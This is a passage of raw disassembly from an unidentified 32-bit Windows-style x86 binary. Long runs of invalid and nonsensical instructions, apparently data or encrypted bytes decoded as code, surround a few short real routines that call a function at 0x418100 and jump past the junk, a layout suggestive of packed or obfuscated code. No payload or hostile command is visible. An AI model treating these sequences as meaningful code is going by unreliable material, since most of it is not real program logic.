  40a893:	mov    esp,0x86cb14ce
  40a898:	setp   BYTE PTR [edi-0x7b]
  40a89c:	outs   dx,DWORD PTR gs:[esi]
  40a89e:	or     DWORD PTR [ebp+ebx*2+0xe],ebp
  40a8a2:	enter  0x9516,0x78
  40a8a6:	test   eax,0x8c61da55
  40a8ab:	outs   dx,DWORD PTR ds:[esi]
  40a8ac:	jbe    0x40a8b5
  40a8ae:	xor    cl,dh
  40a8b0:	xlat   BYTE PTR ds:[ebx]
  40a8b1:	(bad)  
  40a8b2:	call   0xda39d84a
  40a8b7:	outs   dx,BYTE PTR ds:[esi]
  40a8b8:	xor    DWORD PTR [ecx+esi*4],ecx
  40a8bb:	cmp    al,BYTE PTR [esi+0x2df94e2c]
  40a8c1:	cli    
  40a8c2:	popa   
  40a8c3:	xchg   ebx,eax
  40a8c4:	and    DWORD PTR [edx],eax
  40a8c6:	xchg   DWORD PTR [esi-0x41],esp
  40a8c9:	arpl   WORD PTR [esi+0x18],dx
  40a8cc:	xadd   BYTE PTR [ecx],dl
  40a8cf:	sar    cl,0x38
  40a8d2:	xor    dl,ch
  40a8d4:	or     dl,al
  40a8d6:	mov    fs,edx
  40a8d8:	xor    bl,BYTE PTR [esi]
  40a8da:	add    eax,0x3037dfb7
  40a8df:	ds sub dl,bh
  40a8e2:	xlat   BYTE PTR ds:[ebx]
  40a8e3:	lahf   
  40a8e4:	mov    edx,0x39c3b6ec
  40a8e9:	in     al,dx
  40a8ea:	repnz aad 0xff
  40a8ed:	jl     0x40a930
  40a8ef:	inc    esp
  40a8f0:	push   0x1dd2d416
  40a8f5:	nop
  40a8f6:	ficom  WORD PTR [eax]
  40a8f8:	outs   dx,DWORD PTR ds:[esi]
  40a8f9:	or     DWORD PTR [ebp+0x75],esp
  40a8fc:	push   ebp
  40a8fd:	dec    BYTE PTR [ebx+0x39]
  40a900:	stos   DWORD PTR es:[edi],eax
  40a901:	push   edi
  40a902:	retf   
  40a903:	sbb    BYTE PTR [ecx+edi*4-0x3a],bh
  40a907:	jge    0x40a935
  40a909:	or     dl,BYTE PTR [edi-0x7f]
  40a90c:	into   
  40a90d:	inc    esp
  40a90e:	pop    ecx
  40a90f:	fidivr WORD PTR [edi]
  40a911:	inc    ebp
  40a912:	xor    al,0x1e
  40a914:	jl     0x40a91c
  40a916:	outs   dx,DWORD PTR ds:[esi]
  40a917:	outs   dx,BYTE PTR ds:[esi]
  40a918:	(bad)  
  40a919:	fsub   QWORD PTR [esi+0x27]
  40a91c:	jecxz  0x40a963
  40a91e:	inc    edi
  40a91f:	iret   
  40a920:	mov    dl,0xcb
  40a922:	out    dx,eax
  40a923:	lds    ebp,FWORD PTR [edi-0x12590332]
  40a929:	je     0x40a92e
  40a92b:	(bad)  
  40a92d:	sbb    eax,0xc646d9e9
  40a932:	fdiv   DWORD PTR [edx+0xf]
  40a935:	inc    edx
  40a936:	(bad)  [edi+ebp*1-0x2da511c2]
  40a93d:	xor    bh,BYTE PTR [eax]
  40a93f:	fbstp  TBYTE PTR [ebp+0x45]
  40a942:	data16 out dx,al
  40a944:	cmc    
  40a945:	aam    0xde
  40a947:	sbb    ah,BYTE PTR [ecx+0x79]
  40a94a:	and    ebx,DWORD PTR [eax+ebp*2+0x34]
  40a94e:	cmp    ebp,ecx
  40a950:	xchg   esi,eax
  40a951:	sbb    eax,0xad8ce1d7
  40a956:	mov    ebx,0x2fc35d8f
  40a95b:	int3   
  40a95c:	(bad)
  40a960:	jp     0x40a984
  40a962:	push   esp
  40a963:	enter  0x717d,0xb3
  40a967:	stos   DWORD PTR es:[edi],eax
  40a968:	loop   0x40a921
  40a96a:	jp     0x40a97f
  40a96c:	pop    eax
  40a96d:	and    edi,DWORD PTR [edx]
  40a96f:	outs   dx,BYTE PTR ds:[esi]
  40a970:	xchg   ebx,eax
  40a971:	outs   dx,BYTE PTR ds:[esi]
  40a972:	dec    ebp
  40a973:	int3   
  40a974:	mov    WORD PTR [ebx],es
  40a976:	jp     0x40a95b
  40a978:	mov    esi,DWORD PTR [ebp+0xf0e4df3]
  40a97e:	rol    bh,0x21
  40a981:	mov    edx,0x5ace1be2
  40a986:	repz dec edi
  40a988:	dec    edx
  40a989:	or     al,0x76
  40a98b:	push   eax
  40a98c:	push   ecx
  40a98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a98e:	imul   ebp,DWORD PTR [ebx-0x1f],0xabfa6a84
  40a995:	fsubp  st(4),st
  40a997:	adc    al,cl
  40a999:	sub    BYTE PTR [ebx-0x30b91294],dh
  40a99f:	mov    eax,ds:0x422660
  40a9a4:	mov    ecx,DWORD PTR ds:0x42265c
  40a9aa:	and    eax,ecx
  40a9ac:	mov    ecx,DWORD PTR [ebp-0x8]
  40a9af:	or     eax,0x1a56
  40a9b4:	and    ecx,eax
  40a9b6:	mov    eax,0xdcc8
  40a9bb:	sub    eax,ecx
  40a9bd:	mov    ecx,DWORD PTR ds:0x422658
  40a9c3:	sub    eax,ecx
  40a9c5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a9c8:	sub    eax,ecx
  40a9ca:	mov    DWORD PTR [ebp-0x1c],eax
  40a9cd:	mov    DWORD PTR [ebp-0x8],0xd
  40a9d4:	mov    eax,ds:0x422664
  40a9d9:	jmp    0x40ad50
  40a9de:	push   es
  40a9df:	jnp    0x40a9fc
  40a9e1:	(bad)  
  40a9e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9e3:	addr16 es jnp 0x40a9c8
  40a9e7:	stos   DWORD PTR es:[edi],eax
  40a9e8:	loopne 0x40a9e5
  40a9ea:	sbb    DWORD PTR [edi],esp
  40a9ec:	mov    esi,0xbb9c613b
  40a9f1:	mov    ebx,0xbbbbc566
  40a9f6:	lock rol DWORD PTR ds:[ebx],cl
  40a9fa:	dec    eax
  40a9fb:	and    eax,0xeb5fe78e
  40aa00:	(bad)
  40aa04:	xor    esi,edx
  40aa06:	dec    eax
  40aa07:	cmp    esi,esi
  40aa09:	(bad)  
  40aa0a:	cli    
  40aa0b:	fimul  DWORD PTR [edx+0x2c670169]
  40aa11:	cld    
  40aa12:	mov    cl,0xba
  40aa14:	popf   
  40aa15:	aad    0xba
  40aa17:	adc    dh,BYTE PTR [eax-0x21]
  40aa1a:	stos   DWORD PTR es:[edi],eax
  40aa1b:	sub    ecx,eax
  40aa1d:	mov    WORD PTR [ebx+0x7674a7a7],ds
  40aa23:	sbb    DWORD PTR [eax+0x0],0xffffffc0
  40aa27:	inc    ebp
  40aa28:	cmp    BYTE PTR [ecx-0x59c471f4],al
  40aa2e:	ja     0xec559d0a
  40aa34:	jp     0x40aa3c
  40aa36:	mov    BYTE PTR [esp],al
  40aa39:	and    eax,0x8e0a5221
  40aa3e:	(bad)  
  40aa3f:	ins    DWORD PTR es:[edi],dx
  40aa40:	enter  0xa3fa,0x2f
  40aa44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa45:	push   0x48
  40aa47:	sub    al,0x96
  40aa49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa4a:	xor    eax,0xa3e053bc
  40aa4f:	jae    0x40aa69
  40aa51:	inc    esp
  40aa52:	pushf  
  40aa53:	mov    edi,0xe289d8c9
  40aa58:	(bad)  
  40aa5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa5b:	fwait
  40aa5c:	push   ss
  40aa5d:	ret    0x685a
  40aa60:	call   0xce94:0xe81de568
  40aa67:	(bad)  
  40aa68:	in     al,0x50
  40aa6a:	outs   dx,BYTE PTR ds:[esi]
  40aa6b:	stos   DWORD PTR es:[edi],eax
  40aa6c:	inc    edi
  40aa6d:	gs mov al,0x5b
  40aa70:	shl    DWORD PTR es:[eax-0x33139116],0x6c
  40aa78:	and    DWORD PTR [ebx-0x36],esi
  40aa7b:	push   esi
  40aa7c:	xor    BYTE PTR [eax+0x7c],ah
  40aa7f:	sbb    ecx,DWORD PTR [ebx+0x3f14e273]
  40aa85:	mov    ah,0xc4
  40aa87:	sbb    bl,BYTE PTR [edi-0x47]
  40aa8a:	mov    eax,ds:0x1a24b4f
  40aa8f:	cwde   
  40aa90:	pop    esi
  40aa91:	inc    esi
  40aa92:	mov    bl,0xfc
  40aa94:	icebp  
  40aa95:	stos   DWORD PTR es:[edi],eax
  40aa96:	pop    eax
  40aa97:	mov    esp,DWORD PTR [ebp-0x28850b27]
  40aa9d:	adc    bh,BYTE PTR [edx-0x35]
  40aaa0:	xchg   edi,eax
  40aaa1:	test   al,0xa2
  40aaa3:	jb     0x40aa4c
  40aaa5:	or     eax,ecx
  40aaa7:	push   ecx
  40aaa8:	cmp    BYTE PTR [edx-0x6679687a],cl
  40aaae:	dec    DWORD PTR [esi+0x1529f97b]
  40aab4:	adc    DWORD PTR [edx+0x272624c8],0x34
  40aabb:	mov    ebp,0x674b3683
  40aac0:	sub    edi,DWORD PTR [edi+0x55]
  40aac3:	(bad)  
  40aac4:	and    DWORD PTR [eax+ecx*2-0x28c50479],ebx
  40aacb:	pop    esi
  40aacc:	pop    ecx
  40aacd:	mov    edi,0x6d0907b2
  40aad2:	xor    cl,BYTE PTR [esi]
  40aad4:	popa   
  40aad5:	mov    ebx,DWORD PTR [esp+eax*8+0x70074ff9]
  40aadc:	xchg   ebp,eax
  40aadd:	mov    cl,0xcb
  40aadf:	pop    edi
  40aae0:	jne    0x40ab13
  40aae2:	pop    esp
  40aae3:	mov    eax,0x13e312c0
  40aae8:	mov    eax,ds:0xa9e9884d
  40aaed:	adc    bl,BYTE PTR [ebx+0x3e18b3ff]
  40aaf3:	int3   
  40aaf4:	ret    
  40aaf5:	push   ebx
  40aaf6:	inc    edi
  40aaf7:	cli    
  40aaf8:	mov    DWORD PTR [ebx],ecx
  40aafa:	xchg   ecx,eax
  40aafb:	rcl    BYTE PTR [ecx-0x31581502],0x5e
  40ab02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab03:	or     BYTE PTR [esi+0x2a],al
  40ab06:	stc    
  40ab07:	icebp  
  40ab08:	popf   
  40ab09:	inc    esi
  40ab0a:	ja     0x40ab80
  40ab0c:	or     dh,al
  40ab0e:	or     BYTE PTR [edx+esi*8+0xd022a0b],ah
  40ab15:	and    eax,0xd906a7b7
  40ab1a:	sahf   
  40ab1b:	shl    DWORD PTR [edx],cl
  40ab1d:	xchg   DWORD PTR [edx+eax*4],edx
  40ab20:	out    dx,eax
  40ab21:	mov    BYTE PTR [esi-0x1b],ch
  40ab24:	jmp    0x40aac8
  40ab26:	int    0xb3
  40ab28:	jecxz  0x40ab95
  40ab2a:	or     edx,DWORD PTR [esi+edi*8-0x67885f14]
  40ab31:	dec    edi
  40ab32:	sub    edi,edi
  40ab34:	outs   dx,BYTE PTR ds:[esi]
  40ab35:	sub    ecx,DWORD PTR [edx+0x148f9099]
  40ab3b:	stos   DWORD PTR es:[edi],eax
  40ab3c:	mov    ds:0x5f8216ac,al
  40ab41:	and    al,0x8a
  40ab43:	adc    BYTE PTR ds:[ecx+0x7b9ff1b],al
  40ab4a:	cmp    BYTE PTR [edx+0x530b12cc],dl
  40ab50:	leave  
  40ab51:	mov    ds:0xf9be9d98,al
  40ab56:	cs hlt 
  40ab58:	sbb    eax,DWORD PTR [edx+0xd3b5a3]
  40ab5e:	push   edi
  40ab5f:	inc    esi
  40ab60:	mov    ah,0x65
  40ab62:	mov    edi,0x49bf4028
  40ab67:	adc    al,0x92
  40ab69:	and    eax,0x620a4754
  40ab6e:	out    0xfc,al
  40ab70:	lock dec ebp
  40ab72:	dec    edx
  40ab73:	retf   
  40ab74:	xchg   ebp,eax
  40ab75:	enter  0x7bca,0x70
  40ab79:	jle    0x40abaf
  40ab7b:	add    bh,dh
  40ab7d:	mov    ds:0x3b91594c,eax
  40ab82:	cmp    bh,BYTE PTR [edx-0x7d]
  40ab85:	dec    ebp
  40ab86:	push   eax
  40ab87:	es je  0x40ab2f
  40ab8a:	jne    0x40abb6
  40ab8c:	loope  0x40ab7b
  40ab8e:	scas   al,BYTE PTR es:[edi]
  40ab8f:	stc    
  40ab90:	mov    al,BYTE PTR [ebx+0x7b]
  40ab93:	sbb    al,0x78
  40ab95:	mov    ah,0x9e
  40ab97:	ja     0x40ab29
  40ab99:	push   ebp
  40ab9a:	mov    esp,DWORD PTR [ebx+eiz*4+0x2ef2dc3d]
  40aba1:	inc    esp
  40aba2:	aas    
  40aba3:	cs dec edx
  40aba5:	ret    0x5c2d
  40aba8:	jb     0x40abd2
  40abaa:	enter  0xbec9,0x2
  40abae:	or     al,BYTE PTR [esi]
  40abb0:	or     eax,0x3dd7b62c
  40abb5:	aam    0x47
  40abb7:	dec    esi
  40abb8:	mov    bh,ah
  40abba:	repnz daa 
  40abbc:	xor    bh,ch
  40abbe:	and    bl,BYTE PTR [eax-0x13e1588]
  40abc4:	fist   WORD PTR ss:[ebp-0x7927c5de]
  40abcb:	test   BYTE PTR [ebx-0x379d06bb],dl
  40abd1:	adc    bl,dh
  40abd3:	inc    esp
  40abd4:	pushf  
  40abd5:	pop    ds
  40abd6:	xor    ecx,edi
  40abd8:	add    DWORD PTR [edi],0xf398b49a
  40abde:	call   0x2af7:0x2b263582
  40abe5:	(bad)  
  40abe6:	push   edi
  40abe7:	inc    edx
  40abe8:	cmp    al,0xbc
  40abea:	xchg   BYTE PTR [ecx+0x2b3f9da0],cl
  40abf0:	add    ah,al
  40abf2:	jmp    0x9f725aca
  40abf7:	adc    DWORD PTR [edi-0x7277a542],eax
  40abfd:	and    dh,al
  40abff:	inc    esi
  40ac00:	scas   eax,DWORD PTR es:[edi]
  40ac01:	aaa    
  40ac02:	fidivr WORD PTR [ebx+0x13b93650]
  40ac08:	scas   al,BYTE PTR es:[edi]
  40ac09:	pushf  
  40ac0a:	pop    es
  40ac0b:	(bad)  
  40ac0c:	adc    DWORD PTR [esi-0x6a926345],edx
  40ac12:	or     BYTE PTR [ebx],cl
  40ac14:	xlat   BYTE PTR ds:[ebx]
  40ac15:	pop    es
  40ac16:	mov    ds:0xf3c8fb4c,eax
  40ac1b:	jno    0x40ac32
  40ac1d:	cmp    al,BYTE PTR [ebx]
  40ac1f:	ins    DWORD PTR es:[edi],dx
  40ac20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac21:	inc    ebp
  40ac22:	or     edi,DWORD PTR [edx-0xd]
  40ac25:	jbe    0x40ac9d
  40ac27:	nop
  40ac28:	or     al,0xa5
  40ac2a:	stos   BYTE PTR es:[edi],al
  40ac2b:	div    ah
  40ac2d:	cwde   
  40ac2e:	lock mul bh
  40ac31:	or     esi,DWORD PTR [ecx+0x16a6005d]
  40ac37:	loope  0x40abd6
  40ac39:	popa   
  40ac3a:	mov    cl,0xd4
  40ac3c:	(bad)  [eax]
  40ac3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac3f:	and    ebp,edi
  40ac41:	aaa    
  40ac42:	lahf   
  40ac43:	dec    esi
  40ac44:	pushf  
  40ac45:	cmp    ch,0x6a
  40ac48:	dec    edi
  40ac49:	sub    edi,DWORD PTR [ebp+0x46]
  40ac4c:	sti    
  40ac4d:	push   0xffffffac
  40ac4f:	pop    ds
  40ac50:	lds    esp,FWORD PTR [ebp+0x182a8a47]
  40ac56:	cmp    eax,0x2e9d1fe7
  40ac5b:	jmp    FWORD PTR [ebp*2-0x6724636a]
  40ac62:	inc    esp
  40ac63:	cmp    BYTE PTR es:[ebx+0x39],dl
  40ac67:	cmp    BYTE PTR ds:0xa11c75c8,al
  40ac6d:	fist   DWORD PTR [ebx]
  40ac6f:	adc    ah,dl
  40ac71:	fsub   DWORD PTR [esi+ecx*4-0x51]
  40ac75:	outs   dx,DWORD PTR ds:[esi]
  40ac76:	ds ja  0x40acd6
  40ac79:	jmp    0xe0e8:0xc02aa586
  40ac80:	cmp    ch,BYTE PTR [edx+0xa]
  40ac83:	cmp    ebp,DWORD PTR [ecx+0x62]
  40ac86:	(bad)  
  40ac87:	fst    st(4)
  40ac89:	xchg   esp,eax
  40ac8a:	mov    dl,0x73
  40ac8c:	ret    
  40ac8d:	int    0xc1
  40ac8f:	sbb    ebx,0x3a299047
  40ac95:	shr    BYTE PTR [ebx],0xa3
  40ac98:	js     0x40ad09
  40ac9a:	and    BYTE PTR [esi],bl
  40ac9c:	mov    eax,DWORD PTR [ecx]
  40ac9e:	mov    edi,0x8f034c30
  40aca3:	cmc    
  40aca4:	jb     0x40aca1
  40aca6:	inc    ebx
  40aca7:	in     eax,dx
  40aca8:	cdq    
  40aca9:	(bad)  
  40acaa:	std    
  40acab:	push   esi
  40acac:	jb     0x40ac91
  40acae:	jmp    0x40acc4
  40acb0:	test   DWORD PTR [edi+0x3082506e],ebx
  40acb6:	aam    0xe6
  40acb8:	(bad)
  40acbb:	out    0x68,eax
  40acbd:	lods   al,BYTE PTR ds:[esi]
  40acbe:	mov    edx,0x2af3feb7
  40acc3:	lods   eax,DWORD PTR ds:[esi]
  40acc4:	adc    eax,0xe645d57b
  40acc9:	std    
  40acca:	jg     0x40ac82
  40accc:	test   BYTE PTR [esi],dh
  40acce:	inc    esi
  40accf:	and    al,0x47
  40acd1:	xor    eax,DWORD PTR [eax]
  40acd3:	gs test eax,0xf4347766
  40acd9:	cmc    
  40acda:	les    ebp,FWORD PTR [ecx]
  40acdc:	pop    ecx
  40acdd:	mov    bl,0x65
  40acdf:	std    
  40ace0:	shl    DWORD PTR ss:[edx+eiz*1-0x29],0xdc
  40ace6:	mov    edx,0xb0b44528
  40aceb:	(bad)  
  40aced:	mov    ch,0x6c
  40acef:	cmc    
  40acf0:	cdq    
  40acf1:	or     eax,0x6a0b535f
  40acf6:	jp     0x40acdb
  40acf8:	adc    dh,dl
  40acfa:	mov    dh,0x39
  40acfc:	cmp    DWORD PTR [eax+0x2e],eax
  40acff:	push   ss
  40ad00:	enter  0x72f8,0xb8
  40ad04:	fadd   QWORD PTR [eax+0x57]
  40ad07:	test   al,0xf
  40ad09:	fsubrp st(1),st
  40ad0b:	sbb    eax,0x49dfde41
  40ad10:	mov    DWORD PTR [eax+0x463a3915],esp
  40ad16:	into   
  40ad17:	loopne 0x40acb4
  40ad19:	in     al,0xe5
  40ad1b:	call   0x53e91a0d
  40ad20:	fbstp  TBYTE PTR [esp+ebp*2]
  40ad23:	sbb    ebx,ebx
  40ad25:	mov    dh,0x67
  40ad27:	call   0x98460e21
  40ad2c:	pop    esp
  40ad2d:	adc    eax,0x9d1b1edd
  40ad32:	imul   BYTE PTR [edi+0x2a97ef2c]
  40ad38:	repnz or BYTE PTR [esi+ebp*2-0x6f96bbe4],bh
  40ad40:	jns    0x40ad9a
  40ad42:	push   edi
  40ad43:	lahf   
  40ad44:	xor    eax,0x7373f4d9
  40ad49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad4a:	sar    DWORD PTR [edx+0x2],cl
  40ad4d:	pop    edx
  40ad4e:	mov    edi,0xf84d8baa
  40ad53:	or     eax,0x3aa3
  40ad58:	add    eax,0x2ff8
  40ad5d:	div    ecx
  40ad5f:	mov    ecx,0x896
  40ad64:	sub    ecx,eax
  40ad66:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad69:	mov    DWORD PTR [ebp-0x20],0x611c
  40ad70:	mov    DWORD PTR [ebp-0x1c],0x5252
  40ad77:	mov    DWORD PTR [ebp-0x18],0x97e1a567
  40ad7e:	mov    DWORD PTR [ebp-0x14],0x4
  40ad85:	mov    eax,DWORD PTR [ebp-0x18]
  40ad88:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad8b:	mov    edx,DWORD PTR [ebp-0x20]
  40ad8e:	mov    esi,DWORD PTR [ebp-0x1c]
  40ad91:	push   ecx
  40ad92:	push   eax
  40ad93:	push   esi
  40ad94:	push   edx
  40ad95:	call   0x418100
  40ad9a:	push   0x2
  40ad9c:	add    eax,0x6500
  40ada1:	push   0xa241c73f
  40ada6:	adc    edx,0x2b53
  40adac:	push   edx
  40adad:	push   eax
  40adae:	call   0x418100
  40adb3:	push   0xcb2
  40adb8:	jmp    0x40b12f
  40adbd:	mov    edi,0xbda93d48
  40adc2:	mov    ebp,0x6287ad4e
  40adc7:	(bad)  
  40adc8:	outs   dx,DWORD PTR ds:[esi]
  40adc9:	pop    edx
  40adca:	(bad)  
  40adcb:	fdivp  st(3),st
  40adcd:	or     al,0xa4
  40adcf:	mov    ebx,0xbbc566bb
  40add4:	mov    ebx,0x258c993
  40add9:	sbb    al,0xbd
  40addb:	jae    0x40adb0
  40addd:	jno    0x40ad65
  40addf:	add    eax,0x491ead83
  40ade4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ade5:	fwait
  40ade6:	sub    edx,0xffffffc0
  40ade9:	in     al,dx
  40adea:	out    0xa,eax
  40adec:	shr    BYTE PTR [eax],0xbc
  40adef:	jno    0x40adfe
  40adf1:	lods   al,BYTE PTR ds:[esi]
  40adf2:	push   esi
  40adf3:	dec    ecx
  40adf4:	dec    esi
  40adf5:	push   edx
  40adf6:	mov    edi,DWORD PTR [edx+0x56bea40d]
  40adfc:	pop    edx
  40adfd:	add    DWORD PTR [eax-0x5],ecx
  40ae00:	out    dx,eax
  40ae01:	and    DWORD PTR [ebp-0x684a5f62],eax
  40ae07:	mov    gs,WORD PTR [edx-0x2e14fba9]
  40ae0d:	push   ss
  40ae0e:	and    eax,0xcb59d5aa
  40ae13:	mov    esp,0x806a741a
  40ae18:	push   ecx
  40ae19:	test   BYTE PTR [edi+0x1a],0xcf
  40ae1d:	and    al,0x4a
  40ae1f:	jg     0x40ae65
  40ae21:	cwde   
  40ae22:	cmc    
  40ae23:	mov    dh,0x13
  40ae25:	popa   
  40ae26:	adc    BYTE PTR [ebp+0x48fa5510],0x54
  40ae2d:	daa    
  40ae2e:	add    ah,BYTE PTR ds:0xef42710c
  40ae34:	popf   
  40ae35:	push   ss
  40ae36:	jae    0x40ae70
  40ae38:	mov    DWORD PTR [esp],edx
  40ae3b:	mov    bl,0xf0
  40ae3d:	out    0x21,al
  40ae3f:	mov    BYTE PTR [esi+0x216be41d],al
  40ae45:	loopne 0x40aea0
  40ae47:	mov    eax,ds:0xfd1f19ae
  40ae4c:	sar    DWORD PTR [ecx-0x419672b2],0xf2
  40ae53:	scas   al,BYTE PTR es:[edi]
  40ae54:	mov    ch,ch
  40ae56:	adc    eax,0xc70f5200
  40ae5b:	mov    edx,0xc8848cf7
  40ae60:	in     eax,0x6a
  40ae62:	ins    DWORD PTR es:[edi],dx
  40ae63:	fst    QWORD PTR [eax+0x343262f4]
  40ae69:	dec    esp
  40ae6a:	int    0xd1
  40ae6c:	rcr    DWORD PTR [ebp-0x90408fb],0xb1
  40ae73:	jp     0x40ae25
  40ae75:	dec    esp
  40ae76:	aad    0xec
  40ae78:	(bad)  
  40ae79:	test   al,0x3c
  40ae7b:	dec    esp
  40ae7c:	dec    ecx
  40ae7d:	sub    dh,BYTE PTR [ecx+0x50]
  40ae80:	loopne 0x40ae1b
  40ae82:	and    esp,DWORD PTR [ebx]
  40ae84:	or     BYTE PTR [edi+ecx*2],0xf8
  40ae88:	(bad)  
  40ae89:	les    esp,FWORD PTR ds:0x79e16a54
  40ae8f:	les    ebp,FWORD PTR [edx+0x75]
  40ae92:	adc    bh,BYTE PTR [edi+0x65]
  40ae95:	cs nop
  40ae97:	cdq    
  40ae98:	cmp    al,0xf0
  40ae9a:	cld    
  40ae9b:	xchg   ecx,eax
  40ae9c:	sbb    eax,0x4e77285d
  40aea1:	and    eax,0x5492f7de
  40aea6:	sahf   
  40aea7:	(bad)  
  40aea8:	pop    ss
  40aea9:	xchg   BYTE PTR [esi],ch
  40aeab:	dec    ecx
  40aeac:	imul   ebp,ebx,0xde672b78
  40aeb2:	clc    
  40aeb3:	and    bh,BYTE PTR [eax-0x5a]
  40aeb6:	imul   esp,DWORD PTR [esi+edx*2-0xd63e56a],0xa
  40aebe:	dec    edx
  40aebf:	faddp  st(5),st
  40aec1:	rcr    BYTE PTR [edx],0x7a
  40aec4:	pop    ds
  40aec5:	sub    eax,0x99b675a0
  40aeca:	pop    ebp
  40aecb:	mov    ch,0x10
  40aecd:	mov    ?,WORD PTR [edx]
  40aecf:	fld    st(7)
  40aed1:	clc    
  40aed2:	pop    eax
  40aed4:	fnstsw WORD PTR [edx]
  40aed6:	xchg   esi,eax
  40aed7:	xabort 0xd2
  40aeda:	rcr    DWORD PTR [esi+0x65870ddb],1
  40aee0:	jb     0x40aed9
  40aee2:	in     eax,dx
  40aee3:	sbb    eax,0x4cbad038
  40aee8:	(bad)  
  40aee9:	jae    0x40aef9
  40aeeb:	mov    dl,0x24
  40aeed:	mov    bl,0x8a
  40aeef:	sub    eax,0x706e2122
  40aef4:	sub    ch,al
  40aef6:	cwde   
  40aef7:	jle    0x40af53
  40aef9:	mov    edx,0xa44b0cda
  40aefe:	or     BYTE PTR [eax+0x5265f56d],bh
  40af04:	dec    ebp
  40af05:	mov    dl,BYTE PTR [edi+0x5294c73d]
  40af0b:	mov    eax,0x876c04cd
  40af10:	outs   dx,BYTE PTR ds:[esi]
  40af11:	lods   al,BYTE PTR ds:[esi]
  40af12:	xor    al,bl
  40af14:	jne    0x40aecb
  40af16:	das    
  40af17:	sbb    esp,DWORD PTR [ebp-0x59]
  40af1a:	xchg   esp,eax
  40af1b:	mov    al,ds:0x41c7dcde
  40af20:	and    ch,ah
  40af22:	xchg   esp,eax
  40af23:	cmp    ah,BYTE PTR [edx]
  40af25:	jmp    0x11ba7b05
  40af2a:	arpl   ax,sp
  40af2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af2d:	dec    esp
  40af2e:	fs pop esp
  40af30:	adc    eax,DWORD PTR [edx+ebx*2-0x2a]
  40af34:	inc    ebx
  40af35:	sub    BYTE PTR [eax+eiz*1-0x3a],dl
  40af39:	out    0x70,al
  40af3b:	lock pop ebp
  40af3d:	cmp    al,0xc8
  40af3f:	pop    ebx
  40af40:	mov    ebp,0x7b6d51d0
  40af45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af46:	stc    
  40af47:	mov    BYTE PTR [ecx+0x71288c41],dh
  40af4d:	ins    DWORD PTR es:[edi],dx
  40af4e:	xor    DWORD PTR [edx+0x1fb930db],0x3d3b41cd
  40af58:	cmp    DWORD PTR [edi+0x7c382c66],ebp
  40af5e:	fdivr  QWORD PTR [edx+0x60]
  40af61:	loope  0x40afc1
  40af63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af64:	ror    BYTE PTR ds:0x805edba3,cl
  40af6a:	(bad)  
  40af6b:	retf   
  40af6c:	mov    ds:0x7e0b9908,al
  40af71:	hlt    
  40af72:	xor    ebp,0x1d351ff0
  40af78:	rol    DWORD PTR [esi],cl
  40af7a:	push   es
  40af7b:	sbb    DWORD PTR [ebp+0x44],edx
  40af7e:	cmp    DWORD PTR [ebp-0x5d],esi
  40af81:	retf   
  40af82:	pop    esi
  40af83:	test   al,0x85
  40af85:	mov    edi,0x21931549
  40af8a:	pop    ebx
  40af8b:	inc    edi
  40af8c:	and    bl,BYTE PTR [ebx+edx*2]
  40af8f:	jmp    0xbfb1face
  40af94:	inc    eax
  40af95:	jge    0x40af75
  40af97:	push   ebp
  40af98:	sub    esi,DWORD PTR [ecx]
  40af9a:	not    ah
  40af9c:	scas   eax,DWORD PTR es:[edi]
  40af9d:	mov    ecx,0x71d76c74
  40afa2:	mov    dl,bh
  40afa4:	and    esi,0xffffffdf
  40afa7:	jmp    0x40af83
  40afa9:	adc    al,0xe3
  40afab:	inc    ecx
  40afac:	push   0xfffffff2
  40afae:	push   esi
  40afaf:	or     cl,BYTE PTR [ecx+0x7]
  40afb2:	daa    
  40afb3:	jb     0x40af7a
  40afb5:	and    al,0xb2
  40afb7:	adc    BYTE PTR gs:[eax-0x27],0xf9
  40afbc:	fwait
  40afbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afbe:	add    ch,bh
  40afc0:	dec    ebx
  40afc1:	xchg   ecx,eax
  40afc2:	loopne 0x40afe2
  40afc4:	xchg   ebp,eax
  40afc5:	push   ecx
  40afc6:	int    0x4a
  40afc8:	idiv   edx
  40afca:	pop    ecx
  40afcb:	daa    
  40afcc:	add    eax,0x11e807af
  40afd1:	sbb    ebx,0x25
  40afd4:	push   ebp
  40afd5:	inc    esp
  40afd6:	imul   edx,DWORD PTR [ecx+edi*8-0x56],0x1
  40afdb:	aaa    
  40afdc:	dec    ebx
  40afdd:	data16 icebp 
  40afdf:	icebp  
  40afe0:	mov    esp,0x5e18e33c
  40afe5:	cmp    dl,BYTE PTR [edi]
  40afe7:	jno    0x40afe7
  40afe9:	dec    esi
  40afea:	cmp    DWORD PTR [esi-0x7152f871],ebx
  40aff0:	repnz ficomp DWORD PTR [edx+0x163fd435]
  40aff7:	xor    BYTE PTR [eax+0x16],0x43
  40affb:	and    esp,DWORD PTR [eax]
  40affd:	adc    al,0x3d
  40afff:	fdiv   st(2),st
  40b001:	mov    bl,BYTE PTR ds:0xe611ed8b
  40b007:	hlt    
  40b008:	cmp    BYTE PTR [esi+ebp*1-0x48a2127f],0xa5
  40b010:	push   edi
  40b011:	sub    al,0xa
  40b013:	mov    ch,0xcb
  40b015:	out    0x25,eax
  40b017:	mov    si,0x4acb
  40b01b:	popf   
  40b01c:	mov    bl,0x5e
  40b01e:	(bad)  
  40b01f:	shl    DWORD PTR [edx-0xc],cl
  40b022:	enter  0x562e,0x69
  40b026:	loop   0x40afba
  40b028:	and    BYTE PTR [ebp-0x56],bl
  40b02b:	push   ss
  40b02c:	push   edi
  40b02d:	test   al,0x82
  40b02f:	jmp    0x40b083
